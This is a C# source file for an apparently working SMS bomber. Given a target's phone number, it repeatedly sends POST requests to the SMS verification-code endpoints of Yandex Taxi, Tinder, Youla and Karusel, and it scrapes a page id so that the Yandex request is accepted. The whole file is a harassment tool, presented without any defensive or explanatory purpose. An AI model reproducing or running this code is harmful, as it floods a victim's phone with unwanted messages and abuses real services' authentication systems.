using System;
using System.Net;
using System.IO;
using System.Text;
using System.Threading;



namespace test
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            string phone = ""; //without country code

            Yandex temp = new Yandex(phone);
            Tinder tinder = new Tinder(phone);
            Youla youla = new Youla(phone);
            Karusel karusel = new Karusel(phone);


            for (int i = 0; i < 5; ++i)
            {
                temp.SendYaPOST();
                tinder.SendTinderPOST();
                youla.SendYoulaPOST();
                //karusel.SendKaruselPOST();

                Thread.Sleep(5000);
            }
        }

        public static void ShowAnswer(WebRequest request)
        {
            var response = (HttpWebResponse)request.GetResponse();
            using (var streamReader = new StreamReader(response.GetResponseStream()))
            {
                var result = streamReader.ReadToEnd(); Console.WriteLine(result);
            }
        }
    }



    class Yandex
    { 
        public Yandex(string temp)
        {
            phone = "+7" + temp;
        }

        public void GetYaCode()
        {

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/#auth");
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            if (response.StatusCode == HttpStatusCode.OK)
            {
                Stream receiveStream = response.GetResponseStream();
                StreamReader readStream = null;
                if (response.CharacterSet == null)
                {
                    readStream = new StreamReader(receiveStream);
                }
                else
                {
                    readStream = new StreamReader(receiveStream, Encoding.GetEncoding(response.CharacterSet));
                }
                id = readStream.ReadToEnd();
                response.Close();
                readStream.Close();
            }
        }

        public void SendYaPOST()
        {
            GetYaCode();

            string searchID = "],\"id\"";
            int searchResult = id.IndexOf(searchID);
            id = id.Substring(searchResult + 8, 32);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://taxi.yandex.ru/3.0/auth");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"id\":\"" + id + "\"," +
                              "\"phone\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone, id;
    }

    class Tinder
    {
        public Tinder(string temp) 
        {
            phone = "7" + temp;
        }

        public void SendTinderPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=en");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone_number\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class Youla
    {
        public Youla(string temp)
        {
            phone = "+7" + temp;
        }

        public void SendYoulaPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://youla.ru/web-api/auth/request_code");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }

    class Karusel //interval 60 sec
    {
        public Karusel(string temp)
        {
            phone = "7" + temp;
        }

        public void SendKaruselPOST()
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://app.karusel.ru/api/v1/phone/");
            request.ContentType = "application/json";
            request.Method = "POST";

            using (var streamWriter = new StreamWriter(request.GetRequestStream()))
            {
                string json = "{\"phone\":\"" + phone + "\"}";

                streamWriter.Write(json);
            }

            MainClass.ShowAnswer(request);
        }

        private static string phone;
    }
}
